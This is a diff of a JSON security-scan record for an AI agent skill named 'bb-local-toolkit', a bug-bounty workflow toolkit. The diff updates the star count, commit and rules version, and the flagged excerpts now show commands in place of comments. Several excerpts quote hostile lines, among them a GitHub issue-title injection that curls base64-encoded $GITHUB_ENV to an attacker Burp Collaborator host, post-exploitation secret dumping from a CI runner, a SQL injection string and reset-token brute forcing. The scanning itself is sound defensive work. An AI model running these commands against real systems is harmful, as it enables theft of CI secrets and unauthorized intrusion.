@@ -5,15 +5,15 @@
   "path": "skills/bb-local-toolkit",
   "name": "bb-local-toolkit",
   "description": "Local-tooling companion to the bug-bounty orchestrator — carries the SAME complete bug-bounty workflow, but reach for THIS variant when you also need to resolve where tools, wordlists, and clones are installed on the local machine (jhaddix, SecLists, trufflehog, ffuf, dalfox, ghauri); for pure orchestration/routing use the bug-bounty skill. Workflow it covers — recon (subdomain enumeration, asset discovery, fingerprinting, HackerOne scope, source code audit), pre-hunt learning (disclosed reports, tech stack research, mind maps, threat modeling), vulnerability hunting (IDOR, SSRF, XSS, auth bypass, CSRF, race conditions, SQLi, XXE, file upload, business logic, GraphQL, HTTP smuggling, cache poisoning, OAuth, timing side-channels, OIDC, SSTI, subdomain takeover, cloud misconfig, ATO chains, agentic AI), LLM/AI security testing (chatbot IDOR, prompt injection, indirect injection, ASCII smuggling, exfil channels, RCE via code tools, system prompt extraction, ASI01-ASI10), A-to-B bug chaining (IDOR→auth bypass, SSRF→cloud metadata, XSS→ATO, open redirect→OAuth theft, S3→bundle→secret→OAuth), bypass tables (SSRF IP bypass, open redirect bypass, file upload bypass), language-specific grep (JS prototype pollution, Python pickle, PHP type juggling, Go template.HTML, Ruby YAML.load, Rust unwrap), and reporting (7-Question Gate, 4 validation gates, human-tone writing, templates by vuln class, CVSS 3.1, PoC generation, always-rejected list, conditional chain table, submission checklist). Use when you need the local install path of a tool / wordlist / clone for a hunt, or as the full-workflow variant when operating from this local toolkit; for general routing use the bug-bounty skill. 中文触发词：漏洞赏金、安全测试、渗透测试、漏洞挖掘、信息收集、子域名枚举、XSS测试、SQL注入、SSRF、安全审计、漏洞报告",
-  "stars": 5465,
+  "stars": 5490,
   "category": "security",
-  "commit": "3e71af03d48b7bca94a815cfff97431f932748d0",
+  "commit": "42a3ab1bb96426beb98f964d178695c1144c61ea",
   "contentHash": "376044bfe4bc10a747dec7156671817d23287ae36d946dbe6a06ba08554fa096",
   "repoCreatedAt": "2026-05-05T11:22:32Z",
   "alsoFoundIn": [],
   "status": "ok",
   "incomplete": false,
-  "scannedAt": "2026-11-06T19:07:48.007Z",
+  "scannedAt": "2026-11-08T05:42:07.685Z",
   "scan": {
     "findings": [
       {
@@ -97,42 +97,34 @@
         "automatic": false
       },
       {
-        "ruleId": "downloads-code",
-        "file": "skills/bb-local-toolkit/SKILL.md",
-        "line": 206,
-        "excerpt": "# Install: pip3 install semgrep",
-        "disclosed": false,
-        "automatic": false
-      },
-      {
         "ruleId": "shell",
         "file": "skills/bb-local-toolkit/SKILL.md",
-        "line": 206,
-        "excerpt": "# Install: pip3 install semgrep",
+        "line": 209,
+        "excerpt": "semgrep --config=p/security-audit ./",
         "disclosed": true,
         "automatic": false
       },
       {
         "ruleId": "shell",
         "file": "skills/bb-local-toolkit/SKILL.md",
-        "line": 233,
-        "excerpt": "# THE ONE RULE: Always use -ac (auto-calibrate filters noise automatically)",
+        "line": 234,
+        "excerpt": "ffuf -w wordlist.txt -u https://target.com/FUZZ -ac",
         "disclosed": true,
         "automatic": false
       },
       {
         "ruleId": "shell",
         "file": "skills/bb-local-toolkit/SKILL.md",
-        "line": 270,
-        "excerpt": "# Step 1: Subdomains",
+        "line": 271,
+        "excerpt": "subfinder -d TARGET -silent | anew /tmp/subs.txt",
         "disclosed": true,
         "automatic": false
       },
       {
         "ruleId": "shell",
         "file": "skills/bb-local-toolkit/SKILL.md",
-        "line": 295,
-        "excerpt": "# Manual S3 brute",
+        "line": 296,
+        "excerpt": "for suffix in dev staging test backup api data assets static cdn; do",
         "disclosed": true,
         "automatic": false
       },
@@ -150,8 +142,8 @@
       {
         "ruleId": "shell",
         "file": "skills/bb-local-toolkit/SKILL.md",
-        "line": 304,
-        "excerpt": "# ffuf API endpoint brute",
+        "line": 305,
+        "excerpt": "ffuf -u https://TARGET/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,201,301,302,403 -ac",
         "disclosed": true,
         "automatic": false
       },
@@ -177,8 +169,8 @@
       {
         "ruleId": "shell",
         "file": "skills/bb-local-toolkit/SKILL.md",
-        "line": 349,
-        "excerpt": "# Security surface",
+        "line": 350,
+        "excerpt": "cat SECURITY.md 2>/dev/null; cat CHANGELOG.md | head -100 | grep -i \"security\\|fix\\|CVE\"",
         "disclosed": true,
         "automatic": false
       },
@@ -194,8 +186,8 @@
       {
         "ruleId": "shell",
         "file": "skills/bb-local-toolkit/SKILL.md",
-        "line": 368,
-        "excerpt": "# JavaScript/TypeScript -- prototype pollution, postMessage, RCE sinks",
+        "line": 369,
+        "excerpt": "grep -rn \"__proto__\\|constructor\\[\" --include=\"*.js\" --include=\"*.ts\" | grep -v node_modules",
         "disclosed": true,
         "automatic": false
       },
@@ -204,14 +196,6 @@
         "file": "skills/bb-local-toolkit/SKILL.md",
         "line": 371,
         "excerpt": "grep -rn \"child_process\\|execSync\\|spawn(\" --include=\"*.js\" | grep -v node_modules",
-        "disclosed": true,
-        "automatic": false
-      },
-      {
-        "ruleId": "shell",
-        "file": "skills/bb-local-toolkit/SKILL.md",
-        "line": 403,
-        "excerpt": "# By program on HackerOne",
         "disclosed": true,
         "automatic": false
       },
@@ -229,8 +213,16 @@
       {
         "ruleId": "shell",
         "file": "skills/bb-local-toolkit/SKILL.md",
-        "line": 484,
-        "excerpt": "# Rust dangerous patterns (network-facing)",
+        "line": 404,
+        "excerpt": "curl -s \"https://hackerone.com/graphql\" \\",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/bb-local-toolkit/SKILL.md",
+        "line": 485,
+        "excerpt": "grep -rn \"\\.unwrap()\\|\\.expect(\" --include=\"*.rs\" | grep -v \"test\\|encode\\|to_bytes\\|serialize\"",
         "disclosed": true,
         "automatic": false
       },
@@ -254,18 +246,10 @@
         "automatic": false
       },
       {
-        "ruleId": "reads-secrets",
-        "file": "skills/bb-local-toolkit/SKILL.md",
-        "line": 624,
-        "excerpt": "-H \"Authorization: Bearer $TOKEN\" -d 'code=PROMO10' &",
-        "disclosed": true,
-        "automatic": false
-      },
-      {
         "ruleId": "shell",
         "file": "skills/bb-local-toolkit/SKILL.md",
-        "line": 681,
-        "excerpt": "# Single quote test",
+        "line": 682,
+        "excerpt": "' OR '1'='1",
         "disclosed": true,
         "automatic": false
       },
@@ -280,8 +264,8 @@
       {
         "ruleId": "shell",
         "file": "skills/bb-local-toolkit/SKILL.md",
-        "line": 800,
-        "excerpt": "# Clone target's public repos, then:",
+        "line": 801,
+        "excerpt": "find . -name \"*.yml\" -path \"*/.github/workflows/*\" | head -50",
         "disclosed": true,
         "automatic": false
       },
@@ -297,22 +281,6 @@
         ]
       },
       {
-        "ruleId": "reads-secrets",
-        "file": "skills/bb-local-toolkit/SKILL.md",
-        "line": 941,
-        "excerpt": "echo \"::add-mask::$TOKEN\"",
-        "disclosed": true,
-        "automatic": false
-      },
-      {
-        "ruleId": "shell",
-        "file": "skills/bb-local-toolkit/SKILL.md",
-        "line": 979,
-        "excerpt": "# Step 1: Create an issue with injection payload in title",
-        "disclosed": true,
-        "automatic": false
-      },
-      {
         "ruleId": "network",
         "file": "skills/bb-local-toolkit/SKILL.md",
         "line": 980,
@@ -322,6 +290,22 @@
         "hosts": [
           "attacker.burpcollaborator.net"
         ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/bb-local-toolkit/SKILL.md",
+        "line": 980,
+        "excerpt": "gh issue create --repo TARGET/REPO --title '\"; curl https://ATTACKER.burpcollaborator.net/$(cat $GITHUB_ENV | base64 -w0) #' --body \"test\"",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/bb-local-toolkit/SKILL.md",
+        "line": 1039,
+        "excerpt": "5. **Post-exploitation** — After initial access, enumerate all secrets: `env | base64`, `cat /proc/self/environ`, `gcore $(pgrep Runner.Worker)` + `strings core",
+        "disclosed": true,
+        "automatic": false
       },
       {
         "ruleId": "downloads-code",
@@ -342,8 +326,8 @@
       {
         "ruleId": "shell",
         "file": "skills/bb-local-toolkit/SKILL.md",
-        "line": 1165,
-        "excerpt": "# Check for dangling CNAMEs",
+        "line": 1166,
+        "excerpt": "cat /tmp/subs.txt | dnsx -silent -cname -resp | grep -i \"CNAME\" | tee /tmp/cnames.txt",
         "disclosed": true,
         "automatic": false
       },
@@ -358,8 +342,8 @@
       {
         "ruleId": "shell",
         "file": "skills/bb-local-toolkit/SKILL.md",
-        "line": 1207,
-        "excerpt": "# If token < 16 hex chars or numeric only -> brute-forceable",
+        "line": 1208,
+        "excerpt": "ffuf -u \"https://target.com/reset?token=FUZZ\" -w <(seq -w 000000 999999) -fc 404 -t 50",
         "disclosed": true,
         "automatic": false
       },
@@ -374,8 +358,8 @@
       {
         "ruleId": "shell",
         "file": "skills/bb-local-toolkit/SKILL.md",
-        "line": 1231,
-        "excerpt": "# S3 public listing",
+        "line": 1232,
+        "excerpt": "aws s3 ls s3://target-bucket-name --no-sign-request",
         "disclosed": true,
         "automatic": false
       },
@@ -463,15 +447,15 @@
       }
     ],
     "findingTotals": {
-      "downloads-code": 14,
+      "downloads-code": 13,
       "shell": 25,
       "network": 13,
-      "reads-secrets": 2,
+      "reads-secrets": 1,
       "writes-outside": 2
     },
     "score": 64,
     "band": "review",
-    "rulesVersion": "1.0.0",
+    "rulesVersion": "1.3.0",
     "filesScanned": 2,
     "filesSkipped": 0
   },
@@ -481,6 +465,12 @@
       "scannedAt": "2026-11-06T19:07:48.007Z",
       "score": 64,
       "rulesVersion": "1.0.0"
+    },
+    {
+      "commit": "42a3ab1bb96426beb98f964d178695c1144c61ea",
+      "scannedAt": "2026-11-08T05:42:07.685Z",
+      "score": 64,
+      "rulesVersion": "1.3.0"
     }
   ]
 }
